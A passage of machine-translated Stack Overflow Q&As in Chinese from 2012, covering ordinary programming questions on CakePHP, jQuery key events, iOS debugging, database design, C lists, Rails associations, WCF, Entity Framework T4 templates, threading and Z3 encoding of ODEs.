所有正确的信息都在那里，但没有提交到正确的地方，第一个 int 是`invoice_id`，其他其他 int 是`field_id`'test1','test2','test3','test4' 是`entered_value`. 不知何故，我需要对我的视图进行编码，以便将 , 保存`invoice_id`在`field_id,test1`同一个数组中，我该如何实现呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T02:29:35.423

不确定为什么要为每个字段创建 2 个隐藏字段。

首先阅读：[http ://book.cakephp.org/2.0/en/models/saving-your-data.html#saving-related-model-data-hasone-hasmany-belongsto](http://book.cakephp.org/2.0/en/models/saving-your-data.html#saving-related-model-data-hasone-hasmany-belongsto)

```
echo $form->input('Account.0.name', array('label' => 'Account name'));
echo $form->input('Account.0.username');
echo $form->input('Account.0.email'); 
```

然后进一步阅读：[http ://book.cakephp.org/2.0/en/models/saving-your-data.html#saving-hasmany-through-data](http://book.cakephp.org/2.0/en/models/saving-your-data.html#saving-hasmany-through-data)

# javascript - 如何在执行某个操作后自动触发回车按键事件？

> ID：11927078
> 
> 赞同：9
> 
> 时间：2012-08-13T00:52:45.403
> 
> 标签：javascript, jquery, html

我正在我的网络应用程序中编写一些单元测试，并且我想在单击下载到文本文件按钮之后从我的页面自动触发`Enter`按键事件。我如何在 jQuery 或 Javascript 中做到这一点？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-13T01:05:34.990

1.  创建一个变量，告诉我们用户是否单击了您的按钮。

    ```
    var clicked = false; 
    ```

2.  为您的按钮添加一个事件侦听器，这样当用户单击它时，`clicked`变量将变为`true`.

    ```
    myButton.addEventListener('click', function(){
      clicked = true;
    }); 
    ```

3.  添加`keypress`事件监听器：

    ```
    document.addEventListener('keypress', function(e) {
      // `e` is the event
    }); 
    ```

4.  在该事件侦听器中，检查用户之前是否点击过

    ```
    if(clicked) {
      // ...
    } 
    ```

5.  如果他这样做了，请检查按下的键。Enter 的键码是 13。

    ```
    var keynum = e.keyCode||e.which;
    if(keynum == 13) {
       // ...
    } 
    ```

6.  如果按下的键被输入，使用

    ```
    clicked = false; 
    ```

    否则，一旦用户单击您的按钮并按下回车键，就没有必要再次单击该按钮。

7.  之后运行你的代码。例如，这将`f`在 2 秒后调用函数。

    ```
    setTimeout(f, 2000); 
    ```

现场演示

```
var clicked = false;
document.querySelector('#btn').addEventListener('click', function(){
  clicked = true;
  snippet.log("You clicked the button. `clicked` is now `true`");
});
document.addEventListener('keypress', function(e) {
  if(clicked) {
    var keynum = e.keyCode || e.which;
    if(keynum == 13) {
      clicked = false; 
      snippet.log("`clicked` is now `false`. Waiting 2 seconds...");
      setTimeout(f, 2000);
    }
  }
});
function f() {
  snippet.log("Function `f` executed successfully!");
}
```

```
#btn {
  border: 3px solid red;
  cursor: pointer;
}
```

```
<div id="btn">Click me, and then press enter.</div>
<!-- Provides the `snippet` object, see http://meta.stackexchange.com/a/242144/134069 --><script src="http://tjcrowder.github.io/simple-snippets-console/snippet.js"></script>
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-08-13T01:31:32.003

如果我的问题正确，这就是您要找的

```
<html>
<head>

  <script src="http://code.jquery.com/jquery-latest.js"></script>

  <script type="text/javascript">
      $(document).keydown(function(event){
            if(event.keyCode == 13){                
                alert("keypressed");
            }
        });

function clickevent()
{                
     var e = $.Event("keydown");
     e.which = 13;
     e.keyCode = 13;
     $(document).trigger(e);     
}
</script>

</head>
<body id="thebody">
  <input type="button" onclick="clickevent()" value="click me first">
</body>
</html> 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-13T00:53:54.613

如果您正在谈论自动输入一个`Enter`键来触发`submit`事件，您可以使用它来代替：

```
$("#formID").submit(); 
```

* * *

要在按下按钮后触发此事件，请尝试以下操作：

```
$("#buttonID").click(function() {
    $("#formID").submit(); // submits form
}); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-13T01:01:57.603

```
$("#txtfield").keyup(function(e) {
 if(e.keyCode == 13) {
  $("#submit").submit();
 }
}); 
```

# iphone - 无法在设备上调试 - 启动屏幕后关闭

> ID：11927083
> 
> 赞同：2
> 
> 时间：2012-08-13T00:53:38.493
> 
> 标签：iphone, ios, xcode

我一直在尝试使用新的开发人员帐户为 iPhone 开发设置新机器，并且在设备上构建/调试时遇到了一堵墙。我已经完成了所有官方步骤来设置我的证书和个人资料。一切“似乎”都井井有条（不是我的第一个牛仔竞技表演）。

但是，在设备上构建应用程序（空白测试应用程序）时，将显示启动屏幕并立即退出（无 Xcode 输出），而无需接触我的任何代码。深入设备控制台，我得到以下跟踪：

```
TestProject[1029] <Notice>: MS:Notice: Installing: com.fadetocode.TestProject [TestProject] (675.00)
TestProject[1029] <Notice>: MS:Notice: Loading: /Library/MobileSubstrate/DynamicLibraries/Activator.dylib
TestProject[1029] <Notice>: MS:Notice: Loading: /Library/MobileSubstrate/DynamicLibraries/NoAccSplash.dylib
TestProject[1029] <Warning>: MS:Warning: nil class argument
TestProject[1029] <Notice>: MS:Notice: Loading: /Library/MobileSubstrate/DynamicLibraries/PhotoAlbumsPlus.dylib
com.apple.launchd[1] <Notice>: (UIKitApplication:com.fadetocode.TestProject[0xc90f]) Bug: launchd_core_logic.c:3730 (25147):3
com.apple.launchd[1] <Notice>: (UIKitApplication:com.fadetocode.TestProject[0xc90f]) Assuming job exited: <rdar://problem/5020256>: 10: No child processes
com.apple.launchd[1] <Warning>: (UIKitApplication:com.fadetocode.TestProject[0xc90f]) Job appears to have crashed: Segmentation fault: 11
com.apple.launchd[1] <Warning>: (UIKitApplication:com.fadetocode.TestProject[0xc90f]) Throttling respawn: Will start in 2147483645 seconds
SpringBoard[860] <Warning>: Application 'TestProject' exited abnormally with signal 11: Segmentation fault: 11
com.apple.debugserver-64[1018] <Warning>: 1 [03fa/1303]: error: ::read ( 4, 0x2ff819d4, 1024 ) => -1 err = Bad file descriptor (0x00000009) 
```

此外，我可以在设备上手动启动该应用程序，它运行良好。而且我过去（大约 6 个月前）曾使用此设备进行开发，没有任何问题。

我的设置是这样的：

*   设备： iPod touch 第 4 代（越狱），版本 5.0.1

*   基础 SDK：5.1

*   部署目标：5.0

*   Xcode：4.4.1

# database - 数据库优化订单

> ID：11927084
> 
> 赞同：0
> 
> 时间：2012-08-13T00:53:47.733
> 
> 标签：database, database-design

在用户可以下订单的数据库中，最好有一个带有地址的新表，还是每个订单的标题中都有地址数据。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-13T01:04:49.007

一般来说，您很可能想要分开：

*   用户
*   地址
*   订单信息

这是因为用户可以随着时间的推移更改地址，但需要保留旧地址，因为他们有针对他们的命令。另外，一个用户可以从同一个地址有多个订单，因此我们将这些信息分开以减少重复。

[http://en.wikipedia.org/wiki/Database_normalization](http://en.wikipedia.org/wiki/Database_normalization)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-13T08:18:02.903

这不仅与用户（及其地址）有关，还与您所销售产品的价格和其他信息有关，这些信息在下订单**后**可能会发生变化，但订单本身必须保持不变。

通常，有两种方法可以解决此问题：

1.  复制订单中所需的所有内容（及其项目）。即使“主”数据发生变化，您仍然可以使用订单中的副本。
2.  “版本”或“历史化”整个数据库，与[此](https://stackoverflow.com/a/10988116/533120)类似。

(1) 是更“实用”的方法，但可能会导致数据冗余（例如，当地址**不变**时，您仍然会制作它的单独副本）。

(2) 是更“纯粹”的方法，但可能需要更多的 JOINing 并且通常更复杂。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T01:03:01.290

我想不出任何理由让地址与订单在同一个表中，只是它现在可以为您节省少量工作。

有一个单独的表的论据包括：

*   能够将多个送货地址与用户相关联，而无需搜索所有订单（因此很容易为用户提供他们以前使用过的地址的下拉列表）。

*   您可以将同一表用于帐单和收货地址，避免重复

*   您可以扩展/更改将来存储地址的方式（例如，在您走向国际时添加国家/地区字段），而无需更新每个订单。

这些都与优化无关。不知道为什么在标题中？

[Branko 关于保留订单数据有一个很好的观点。但是，您不需要使数据库完全版本化。您可以简单地在从订单中引用但不再具有当前值的事物（例如用户和地址）上设置一个“过期”标志。换句话说，您只需要两个“版本”——当前版本和历史版本。只要您在订单表中明确引用（因此您不会通过用户转到交货地址，而是直接从订单表链接到地址表，这可以使其工作。完全版本控制数据库，包括关系，是很多工作。]

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-06-16T03:21:35.173

不要重新发明轮子。订单系统已经存在了很长时间，并且已经建立了良好的最佳实践。您可以创建一个地址簿，以便您的联系人可以拥有多个地址。联系人具有零对多地址。但是，在发货时，请务必将地址副本保留在订单（或发货实体）中。为了维护准确的历史数据，将地址存储为时间点数据非常重要。Magento、Shopify、Quickbooks 所有主要的会计和电子商务系统都有这样的模型。Saasu 会计是一个例外。他们不会将地址与订单一起保存，因此您必须为每个订单创建一个新联系人，否则如果您修改了客户地址，您最终会在历史订单上重写地址。一个非常糟糕的设计！

# c - 制作一个通用 C 列表以包含指针

> ID：11927088
> 
> 赞同：0
> 
> 时间：2012-08-13T00:54:38.043
> 
> 标签：c, list

我有一个通用列表，它 100% 有效并保持：

```
/**
 * Generic List Container
 *
 * Implements a list container type.
 * The list his an internal iterator for external use. For all functions
 * where the state of the iterator after calling that function is not stated,
 * it is undefined. That is you cannot assume anything about it.
 *
 * The following functions are available:
 *
 *   listCreate               - Creates a new empty list
 *   listDestroy              - Deletes an existing list and frees all resources
 *   listCopy                 - Copies an existing list
 *   listGetSize              - Returns the size of a given list
 *   listFirst                - Sets the internal iterator to the first element
 *                              in the list, and returns it.
 *   listInsertFirst          - Inserts an element in the beginning of the list
 *   listInsertLast           - Inserts an element in the end of the list
 *   listInsertBeforeCurrent  - Inserts an element right before the place of
 *                              internal iterator
 *   listInsertAfterCurrent   - Inserts an element right after the place of the
 *                              internal iterator
 *   listRemoveCurrent        - Removes the element pointed by the internal
 *                              iterator
 *   listGetCurrent           - Return the current element (pointed by the 
 *                              internal iterator)
 *   listGetFirst             - Sets the internal iterator (also called current 
 *                              element) to be the first element in the list and 
 *                              return it.
 *   listGetNext              - Advances the list's iterator to the next element 
 *                              and return it 
 *   listSort                 - Sorts the list according to a given criteria
 *   listFilter               - Creates a copy of an existing list, filtered by
 *                              a boolean predicate
 *   listClear            - Clears all the data from the list
 */ 
```

我提供

```
 /** Element data type for list container */
typedef void* ListElement;

/** Type of function for copying an element of the list */
typedef ListElement (*CopyListElement)(ListElement);

/** Type of function for deallocating an element of the list */
typedef void (*FreeListElement)(ListElement);

List listCreate(CopyListElement copyElement, FreeListElement freeElement); 
```

现在，我想使用这个列表来保存指向数据的指针，而不是数据本身。例如，我想要一个类型的结构列表

```
 struct CASH_element {
        int id;
        int passengers;
        int unpaidPassengers;
        bool reset;
        int profit;
    } Cash;

    struct Transportation_element {
        List cashes; //list of cashes
        int travels;
        int profit;
    }; 
```

所以当我创建我使用的运输类型时：

```
 Transportation* systemToAdd;
    systemToAdd->cashes = listCreate(cashCopy, DestroyCash);
    /* MORE CODE*/ 
```

现在，有趣的函数是 copyElement 函数：

```
 void* cashCopy(void* cashCopy) {
    Cash* toCopy = (Cash*) cashCopy;
    if (toCopy == NULL) {
        return NULL;
    }

    Cash* toAdd =  (Cash*) malloc(sizeof(*toAdd));
    if (toAdd == NULL) {
        return NULL;
    }

    toAdd->id = toCopy->id;
    toAdd->passengers=toCopy->passengers;
    toAdd->unpaidPassengers = toCopy->unpaidPassengers;
    toAdd->reset=toCopy->reset;
    toAdd->unpaidPassengers=toCopy->unpaidPassengers;
    toAdd->profit=toCopy->profit;

    return  (Cash*)  toAdd;; 
```

显然，这会按价值复制现金及其所有数据，一旦我独立更新现金，列表节点就不会更新。我希望它被更新。我想我必须使用指针。我试过修改函数但失败了：

```
 void* cashCopy(void* cashCopy) {

        return  (Cash*)&cashCopy;
   }

   and adding is straightforward:
     TransportationStatus trAddCash(Transportation* system, Cash c) {
        if (system == NULL) {
            return TR_FAIL;
        }
    Cash* cash=&c;
    if (LIST_SUCCESS != listInsertLast(system->cashes, cash)) {
        return TR_FAIL;
    }

    return TR_SUCCESS;

   } 
```

有一个我想要工作的代码示例：

```
 cs1 = cashCreate(&c1, 123);
    Transportation trans1;
        TransportationStatus tr1;
    tr1=trCreate(&trans1);
    ASSERT_TEST(tr1==TR_SUCCESS);

    cs1 = cashTravel(&c1, &rq1, 660, "09/08/2011-02:51"); //THE FIRST TRAVEL
    tr1=trAddCash(&trans1,c1); //ADD THE CASH TO THE TRANSPORTATION STRUCT
    ASSERT_TEST(tr1==TR_SUCCESS);
    tr1=getTotalTravels(trans1, &result);
    ASSERT_TEST(result==1); //THAT'S OKAY BECAUSE TRAVEL BEFORE COPYING
    cs1 = cashTravel(&c1, &rq1, 660, "13/08/2011-02:51"); //THE SECOND TRAVEL
   tr1=getTotalTravels(trans1, &result);
   ASSERT_TEST(result==2); //FAIL!!!!
      cashTravel(listGetFirst(trans1.cashes),  &rq1, 660, "13/08/2010-02:51"); //TRAVEL WITH THE LIST   NODE
        tr1=getTotalTravels(trans1, &result);
  ASSERT_TEST(result==2); //SUCCESS!!!! 
```

所以基本上，我想修改我的复制功能，以便我可以独立更新节点

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T01:00:14.960

尽管您的代码“有效”，但它非常复杂。现在您发现“工作”并不是代码的主要优点——您需要有足够简单的东西，以便当需求发生变化时，您可以更改代码或编写新代码。

完全放弃此代码，并使用您所学的知识来制作一个*新*的列表模块，您可以轻松地对其进行修改以保存指针。

*提示：*你怎么知道谁的责任`malloc`和`free`那些指针？

# javascript - offsetWidth 返回不正确的值

> ID：11927096
> 
> 赞同：5
> 
> 时间：2012-08-13T00:56:39.587
> 
> 标签：javascript, html, css, offsetwidth

好的，所以我正在尝试制作一个水平站点，但是当我尝试获取导航的 offsetWidth 时，它返回的值远高于真实宽度。有问题的设计可以在[这里](http://jordan-adams.co.uk/2012/3/)找到。页面的 CSS 在[这里](http://jordan-adams.co.uk/2012/3/assets/css/base3.css)，JS[在这里](http://jordan-adams.co.uk/2012/3/assets/js/events.js)。

非常感谢任何可以解决这个问题的人:)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-13T08:12:13.697

这是您的页面在应用 CSS 之前的样子：http: [//img571.imageshack.us/img571/1047/shotjt.png](http://img571.imageshack.us/img571/1047/shotjt.png)。在那一刻，#projects nav 的宽度是客户端屏幕的宽度。

你有两个解决方案：

1.  在样式属性中指定#projects nav 的宽度
2.  为 init JS 函数添加一些超时： domready(function() { setTimeout("initPageFunction()", 200); }

令人惊讶的是，它在 IE 中运行良好 :)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-11-08T22:12:22.963

另一种解决方案是将 body margin 设置为 0，通常在未设置宽度且未触及 body margin 的情况下，渲染可能会偏离 16 个像素，即 body 标签的每边（左右）各占 8 个像素。

罗德里戈。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T08:14:25.023

这是因为边距创建的空间是计算出来的，最后一篇文章有​​右边距。这是固定的脚本。

```
domready(function() {

    var projectsContainer = qwery('#projects')[0];
    var projects = qwery('.project');
    var projectsNav = qwery('#projects nav')[0];

    var pMargin = 40;
    var pnW = projectsNav.offsetWidth+cMargin;

    for(p in projects) {
        projects[p].style.marginRight = pMargin+'px';
    }

    projectsContainer.style.width = (projects.length*(projects[0].offsetWidth+pMargin))+pnW+'px';

}); 
```

# opencpu - OpenCPU没有更新png

> ID：11927097
> 
> 赞同：1
> 
> 时间：2012-08-13T00:56:41.863
> 
> 标签：opencpu

当我使用新数据集调用 hist 函数时，OpenCPU 不会更新图形。它有时确实会改变，但它不可靠我想知道为什么会这样

方法 = POST 端点：/R/pub/graphics/hist/png 参数：x, c(1,2,3)

输出是带有 1,2,3 的直方图

然后我做

方法 = POST 端点：/R/pub/graphics/hist/png 参数：x, c(1,2,3,4,5,6,7)

输出仍然是1,2,3的直方图我刷新页面并尝试再次调用它，请告诉我这里发生了什么

附加说明：我可以执行 /save 作为输出，然后使用返回的对象来查看它工作的对象，但如果我不必进行两次 REST 调用来获取绘图，那就太好了

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T09:43:19.493

听起来像一个缓存问题。您使用的是哪个浏览器？你`opencpu-cache`安装了吗？

# node.js - 在 Node.js 中缓存网站数据

> ID：11927100
> 
> 赞同：0
> 
> 时间：2012-08-13T00:57:20.633
> 
> 标签：node.js, web-applications, express

我对 Node.js 完全陌生，并试图弄清楚一些事情。最初我使用的是 apache，并在 .htaccess 中用于`mod_expires.c`缓存数据。例如我会这样做：

```
ExpiresByType text/css               "access plus 1 year"
ExpiresByType application/javascript "access plus 1 year" 
```

我还设置了`mod_rewrite.c`cachebusting [，](https://github.com/h5bp/html5-boilerplate/wiki/cachebusting)所以每当我需要更新我的 css 或 javascript 时，我只需更改 html 中的版本，请求就会被路由到常规文件。

如何在 Node.js 中实现这些功能。我目前也在使用[Express](http://expressjs.com/)模块。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T03:40:12.887

`express.static`（这只是一个公开的版本，`connect.static`因此可以在连接下找到文档）带有`maxAge`参数应该可以完成您想要的大部分或全部操作。还要查看`express.staticCache`（再次，别名`connect.staticCache`）。

# wcf - 在服务器上应用更改后，客户端如何取回实体的属性更改

> ID：11927102
> 
> 赞同：0
> 
> 时间：2012-08-13T00:57:47.950
> 
> 标签：wcf, timestamp, identity, n-tier-architecture, dbcontext

我有一个 WCF 服务，它实现了一个接口方法来保存这样的实体：

```
IFinantialTxService svc = BaseServiceLayer.CreateChannel<IFinantialTxService>
SomeEntity cur = GetCurrentObject() as SomeEntity;
svc.SaveFinTxName(cur); 
```

好的，现在“cur”对象是一个由客户端用户创建和填充的新实体，它有一个身份字段和一个时间戳，插入后将由数据库填充。我如何将这两个字段反映给客户？我应该通过引用传递实体吗？或者我可以在保存后立即从数据库中获取一个新实例吗？或者我应该将它们作为输出返回还是从服务返回值？任何想法我将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T01:10:09.123

您不能在 WCF 中通过引用发送对象。WCF 作为跨进程边界发送数据的任何技术都不支持这一点。您发送的任何对象都会被序列化（转换为 XML、JASON、二进制流，具体取决于您的绑定），并在从客户端发送到服务器或从服务器发送到客户端时反序列化。

您应该将带有填充字段的实体发送回客户端，而不是`void`.

替换这个：

```
void SaveFinTxName(SomeEntity cur); 
```

用这条线：

```
SomeEntity SaveFinTxName(SomeEntity cur); 
```

# ruby-on-rails - Rails 从多对多关联中访问信息

> ID：11927106
> 
> 赞同：0
> 
> 时间：2012-08-13T00:58:16.297
> 
> 标签：ruby-on-rails, ruby

我希望在 Rails 应用程序中的用户之间分享课程。用户 A 创建了一些课程并希望与用户 B 和 C 共享。用户 A 创建课程，将用户 B 和 C 添加到课程中，他们现在可以看到课程。我的问题是如何让共享课程出现在用户 B 和 C 共享页面中？每节课都属于一个笔记本。

**笔记本.rb**

```
belongs_to :user
has_many :lessons, :dependent => :destroy 
```

**课程.rb**

```
belongs_to :notebook
has_many :shareships
has_many :users, through: :shareships, dependent: :destroy
attr_reader :user_tokens
accepts_nested_attributes_for :shareships, :reject_if => lambda { |a| a[:user_ids].blank? }
scope :shared, lambda { where('shared_ids = ?') 
```

**用户.rb**

```
has_many :notebooks, dependent: :destroy 
```

**分享.rb**

```
belongs_to :lesson
belongs_to :user 
```

**课程控制器.rb**

```
class LessonsController < ApplicationController
  before_filter :authorize, :find_notebook
  load_and_authorize_resource :through => :notebook, :except => [:public]
  respond_to :html, :js, :json 

  def create
    @lesson = @notebook.lessons.build(params[:lesson])
    @lesson.user_id = current_user.id
    flash[:notice] = 'lesson Added!.' if @lesson.save
    respond_with(@lesson, :location => notebook_lessons_path)
  end

    def shared
      @user = current_user
      @shared = @notebook.lessons
    end
end 
```

我已经在用户和课程之间设置了多对多关联，因此用户可以将其他用户添加到课程中，但我正在尝试弄清楚如何为共享用户列出课程。有什么想法可以让它发挥作用吗？我无法设置它以及我的控制器和视图。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-15T00:35:21.577

我会做这样的事情

**笔记本.rb**

```
has_many :lessons
belongs_to :user 
```

**课程.rb**

```
belongs_to :notebook
has_many :shareships
has_many :users, through: :shareships, dependent: :destroy # shared users of this lesson, not the owner 
```

**用户.rb**

```
has_many :notebook # the user will go through the notebook to get the lesson he owns
has_many :shareships
has_many :lessons, through: :shareships, dependent: :destroy # this would be only the shared lessons he has access to 
```

**分享.rb**

```
belongs_to :lesson
belongs_to :user 
```

用户可以通过以下方式访问他拥有的课程

```
/:user_id/notebooks/:notebook_id/lesson/:lesson_id 
# lessons = user.notebooks[:notebook_id].lessons 
```

他可以通过以下方式获得与他分享的课程

```
/:user_id/shared_lessons/:lesson_id
# shared_lessons = user.lessons 
```

用户无法直接访问他拥有的课程，他需要浏览他的笔记本。但他可以直接访问共享课程。

你怎么看 ？

# asp.net - Asp.NET Response.Write() 消失但仍在编写

> ID：11927107
> 
> 赞同：0
> 
> 时间：2012-08-13T00:58:48.580
> 
> 标签：asp.net

我是一个 ASP.NET 菜鸟，到目前为止，我主要从事桌面和中间件服务开发。我提前为我的菜鸟道歉。

在我的几个页面上，我使用了 Response.Write("Data loading....") 类型的命令来给用户一些非常基本的反馈，同时一些数据表填充了大量数据。我的问题是，我已经从任何地方删除了它（是的，它真的从任何地方完全消失了）但它仍然出现在浏览器中。为什么？

我做了以下但没有摆脱它：

1.  关闭浏览器，清除所有 cookie/临时文件，重新启动我的工作站....
2.  回收应用程序池并重新启动站点，同时重新启动服务器......

我已经完成了我能想到的所有事情，但它仍然显示在浏览器中。我猜它缓存在某个地方，我会假设我所做的一切都会清除它。

我错过了什么？提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T01:56:26.440

非常感谢大家的帮助。我认为它必须是非常简单的东西（忽略一些基本的东西）或者宇宙正准备被吸入黑洞。

该站点正在使用批处理脚本部署到服务器以完成所有工作。出于某种原因，要移动到服务器的文件路径在脚本中被硬编码，因此它复制了错误版本的站点。这直接对应并发生，因为我刚刚将我的开发环境移动（复制）到了不同的文件夹。

更新了部署脚本。现在正在复制正确的文件。解决。（天哪。）

再次感谢！

# c# - 实体框架和数据库列名

> ID：11927110
> 
> 赞同：5
> 
> 时间：2012-08-13T00:59:20.930
> 
> 标签：c#, entity-framework, poco

我正在尝试修改 POCO T4 模板以包含数据库中与每个属性对应的列的名称。由于遗留原因，我们的数据库表是 8.3，我们的列最多 10 个字符，所以事情往往会被缩写。能够快速查找给定属性对应的列将是一个很大的帮助。

鉴于此，我不知道如何去做。我对编辑 T4 模板的想法很满意，只是不知道如何从 EdmProperty 对象中检索列名。

谁能指出我正确的方向？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T08:40:19.527

我已经在其他答案中讨论过这个问题，但我找不到它知道。问题是要获取此信息，您需要浏览映射的 MSL 部分 - 列映射到属性的部分。不幸的是，用于 MSL 元数据项的整个 API 是内部的（我认为未来 EF 版本的一个目标是使其公开）。当您拥有用于类生成的 T4 模板时，您通常使用 CSDL - 即实体描述，它仅包含您在 EDMX 图表和实体属性窗口中看到的信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-06-17T16:23:35.953

我不会说这是解决这个问题的最好方法，但我就是这样做的。我需要能够以纯文本形式检索列名以绑定到 BoundField asp 控件，而这并未融入 EF 模板中。

所以，我添加了这段代码，它只加载“简单属性”，即：列名，以允许我这样做。它向名为“ColumnNames”的“table”对象添加了一个结构，并将列名公开为 const 字符串。

```
<#
    if (simpleProperties.Any())
    {
#>
    public struct ColumnName 
    {
  <# 
      foreach (var simpleProperty in simpleProperties)
      {
  #>
      public const string <#= simpleProperty #> = "<#= simpleProperty #>";
  <# 
      }
  #>
  }
<#  }
#>
} 
```

我将它放在 T4 模板中的这段代码之前，该模板在解决方案中的 edmx 文件下生成单个文件：

```
<#
    EndNamespace(code);
} 
```

这将创建如下所示的代码：

```
public partial class JobPosting
{
    public int PositionRowId { get; set; }
    public System.Guid PositionRelatedGuid { get; set; }

    public struct ColumnName 
    {
        public const string PositionRowId = "PositionRowId";
        public const string PositionRelatedGuid = "PositionRelatedGuid";
    }
} 
```

我希望这有帮助。

# c# - HttpWebRequests 阻塞来自另一个线程的 UI 线程

> ID：11927112
> 
> 赞同：0
> 
> 时间：2012-08-13T00:59:54.487
> 
> 标签：c#, multithreading, httpwebrequest

我在 Seaprate 线程上执行多个 HttpWebRequests，但我的 UI 线程在我调用后几乎一直被阻塞`Start()`，我不知道为什么，这是最重要的代码：

```
private void Start()
{
    for (int i = 0; i < 10; i++)
    {
        var todo = UrlStack.UrlPartitions.First();
        UrlStack.UrlPartitions.Remove(todo);
        ThreadPool.QueueUserWorkItem(new WaitCallback(ScanSites), todo);
    }
}
private void ScanSites(object o)
{
    var ToDo = (List<string>)o;
    foreach (string Url in ToDo)
    {
        var state = MakeRequest(Url);
        var website = WebsiteProcessing.ProcessResponse(state);
        if (website != null)
        {
            Websites.Add(website);
            WebsitesCount++;
            this.UIThread(() => lblCrawledWebsites.Text = WebsitesCount.ToString());
        }
    }
}
private static RequestState MakeRequest(string url)
{
    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
    ...
    RequestState state = new RequestState();
    HttpWebResponse response = null;
    Stream responseStream = null;
    StreamReader sr = null;

    try
    {
        response = (HttpWebResponse)request.GetResponse();
        responseStream = response.GetResponseStream();
        sr = new StreamReader(responseStream);
        state.Request = (HttpWebRequest)request;
        state.Response = (HttpWebResponse)response;
        string strContent = sr.ReadToEnd();
        state.ResponseContent = new StringBuilder(strContent);
    }
    catch
    {
        return null;
    }

    finally
    {
        if (responseStream != null)
            responseStream.Close();
        if (sr != null)
            sr.Close();
        if (response != null)
            response.Close();
    }

    return state;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T12:33:12.660

我发现了让我非常吃惊的故障。这是一个带有 20-30 个正则表达式的自定义类，用于在使用 HtmlAgilityPack 提取文本后剥离剩余的 HTML，我仍然不明白的是后台线程如何阻止 UI，CPU 峰值从未超过 50%。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T16:47:06.747

可能是因为这个电话？

```
this.UIThread(() => lblCrawledWebsites.Text = WebsitesCount.ToString()); 
```

您没有提供 UIThread 的定义，但看起来它正在编组对 UI 线程的调用。在这种情况下，如果 ToDo 列表中有很多 URL，它可能会阻塞 UI 线程。

# z3 - 将一阶微分方程编码为一阶公式

> ID：11927114
> 
> 赞同：1
> 
> 时间：2012-08-13T01:00:11.193
> 
> 标签：z3, smt

# 有人可以帮助我指出使用一阶公式对以下方程进行最佳编码，以便将其作为 SMT 求解器的输入吗？

```
x`=Ax+b 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-13T14:22:22.040

您可以在 Z3 中轻松编码微分方程，因为它只是 n^2 + n 个实常数（a_ij 中的 n^2，b_i 中的 n）和 n 个实变量 (x_i) 上的一组 n 个线性（仿射）函数。您可以直接在 Z3 中对其进行编码。

```
dotx_1 = a_11 * x_1 + a_12 * x_2 + a_13 * x_3 + ... + a_1n * x_n + b_1
dotx_2 = a_21 * x_1 + a_22 * x_2 + a_13 * x_3 + ... + a_2n * x_n + b_2
...
dotx_n = a_n1 * x_1 + a_n2 * x_2 + a_n3 * x_3 + ... + a_nn * x_n + b_n 
```

这是 Z3Py 中 2x2 版本的链接：[http: //rise4fun.com/Z3Py/pl6P](http://rise4fun.com/Z3Py/pl6P)

但是，编码 ODE 的解将很困难，因为线性 ODE 的解涉及指数（超越函数）。对于具有可以表示为多项式（在 a_ij 常数、x_i 变量和/或时间变量 t 上）的解的 ODE 类，您将能够将（精确）解编码为 Z3 中的多项式（参见，例如, [1])。

但是，对于涉及先验的一般解决方案，您有许多可能的选择，具体取决于您要完成的工作。一种选择是将先验建模为未解释的函数。各种 SMT-LIB 基准测试中有一些工作可以做到这一点，但我对这些不是很熟悉，所以希望其他人可以指出它们的链接。如果您想证明有关此类 ODE 解决方案的一些引理，这将是最有用的。像 MetiTarski 这样的一些工具维护超越数的上限和下限近似值（例如，使用截断的泰勒级数，它们是多项式，因此可以在 Z3 中表示），但我不知道 Z3 中的状态，但它看起来像可能会有一些支持，莱昂纳多可以评论更多 [6]。

如果您正在进行可达性计算，那么您可能会过度近似范围集，这可以通过 ODE 解的更简单（更抽象）表示来完成。例如，您可以应用混合技术 [2] 的一种变体，并使用矩形动力学过度逼近线性动力学，例如，划分状态空间的一个有趣子集，然后在每个划分中，低于和过度逼近每个维度 dotx_i = a_i1 x_1 + a_i2 x_2 + ... + b_i 与 dothatx_i \in [C, D] 选择一些常数 C 和 D 以确保原始（具体）x_i 的每个解都包含在过度近似（抽象）解 hatx_i 的集合中。hatx_i 从时间 0 到 t 的解集在区间 [C t + x_i(0), D t + x_i(0)] 中，其中 x_i(0) 是 x_i 在时间 0 的初始条件，并且 t 是您要计算设置的范围的有界实时。您可以在所有维度上执行此操作。要计算 C、D（每个分区和每个维度可能会有所不同），取决于您对稳健性的关心程度，您可以简单地（在数字上）最大化和最小化每个分区中的原始 ODE dotx_i。

从您的其他帖子中，您似乎正在尝试模拟混合系统。模拟在尝试表示先验时仍然会遇到问题，因为即使尝试对一条轨迹进行建模（而不是对一组可能的轨迹进行建模）也需要表示解决方案，这通常是先验的。据我所知，这仍然在模拟社区中以数值方式完成[参见，例如，3]，但是有关于“保证”（声音）集成的工作，它提供了数值解与实际（分析) 解决方案 [4, 5]。

